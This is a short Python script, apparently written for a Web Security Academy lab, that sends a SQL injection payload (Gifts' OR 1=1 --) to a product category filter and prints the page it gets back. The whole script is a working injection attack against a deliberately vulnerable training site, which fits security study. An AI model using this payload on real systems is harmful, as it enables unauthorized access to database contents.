import requests
import sys
import re
from bs4 import BeautifulSoup


s = requests.Session()

site = 'acfa1f3d1f4b7d7ec0ab10860073005c.web-security-academy.net'


def try_category(category_string):
    url = f'https://{site}/filter?category={category_string}'
    resp = s.get(url)
    print(resp.text)

s = requests.Session()
try_category(""" Gifts' OR 1=1 -- """)